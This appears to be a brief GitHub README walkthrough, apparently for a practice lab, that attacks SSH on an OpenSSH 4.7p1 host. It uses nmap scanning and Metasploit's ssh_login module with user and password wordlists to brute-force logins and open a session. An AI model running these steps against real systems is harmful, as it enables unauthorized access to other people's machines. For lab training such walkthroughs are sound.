# Port-22-sshOpenSSH-4.7p1-Debian-8ubuntu1-protocol-2.0-
1.nmap -sV <target>
![image](https://github.com/thanawut2903/Port-22-sshOpenSSH-4.7p1-Debian-8ubuntu1-protocol-2.0-/assets/159118913/fab2c2c5-0bc1-49cb-8383-a87560d454a1)
2.msfcomsole
3.msf 6 > search ssh
![image](https://github.com/thanawut2903/Port-22-sshOpenSSH-4.7p1-Debian-8ubuntu1-protocol-2.0-/assets/159118913/6af833f7-31a4-441b-8a2d-6ade8f9f581a)
4.msf 6 > use auxiliary/scanner/ssh/ssh_login
![image](https://github.com/thanawut2903/Port-22-sshOpenSSH-4.7p1-Debian-8ubuntu1-protocol-2.0-/assets/159118913/66924c56-d235-40a1-8a68-344f719cb9b5)
5.create file user.txt and password.txt
![image](https://github.com/thanawut2903/Port-22-sshOpenSSH-4.7p1-Debian-8ubuntu1-protocol-2.0-/assets/159118913/9208b4f3-89b1-42b7-86a6-b7330a5bc8e9)
6.msf 6 > set RHOST <target>
7.msf 6 > set VERBOSE true
8.msf 6 > set user_file <path user.txt>
9.msf 6 > set pass_file <path password.txt>
10.msf 6 > set stop_on_success true
![image](https://github.com/thanawut2903/Port-22-sshOpenSSH-4.7p1-Debian-8ubuntu1-protocol-2.0-/assets/159118913/d41258f4-5d7a-4157-af30-c8fe096a9080)
11.msf 6 > run
![image](https://github.com/thanawut2903/Port-22-sshOpenSSH-4.7p1-Debian-8ubuntu1-protocol-2.0-/assets/159118913/458c8bb8-08e1-4a20-ac9a-4d0923aa06d4)
12.msf 6 > session -i 1 
![image](https://github.com/thanawut2903/Port-22-sshOpenSSH-4.7p1-Debian-8ubuntu1-protocol-2.0-/assets/159118913/655597c5-1e99-4fca-abc5-93d9d17b0092)


